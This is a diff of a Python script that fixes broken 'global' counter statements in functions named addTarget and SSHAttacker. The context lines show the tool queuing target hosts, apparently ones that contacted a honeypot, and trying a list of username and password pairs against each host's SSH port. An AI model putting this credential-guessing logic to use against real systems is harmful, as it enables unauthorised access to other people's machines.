@@ -48,7 +48,8 @@ def debug(str):
 
 #------------- HoneyPot Section -------------
 def addTarget(target):
-    global targetsInQ += 1
+    global targetsInQ
+    targetsInQ += 1
     debug("{} {}".format(inspect.currentframe().f_code.co_name, target))
     queOfTargets.put(target)
     setOfCaptureTargets[target] = int(time.time())
@@ -150,8 +151,10 @@ def SSHAttacker():
         # if(queOfTargets.empty)
         target = queOfTargets.get()
         logger(attackLog, "starting attack   {}".format(target))
-        global attackedTargets += 1
-        global targetsInQ -= 1
+        global attackedTargets
+        attackedTargets += 1
+        global targetsInQ
+        targetsInQ -= 1
         for i in listOfLogins:
             logger(attackLog, "try   {} {} {}".format(target, i[1][0], i[1][1]))
             status = SSHCheck(target, 22, i[1][0], i[1][1])
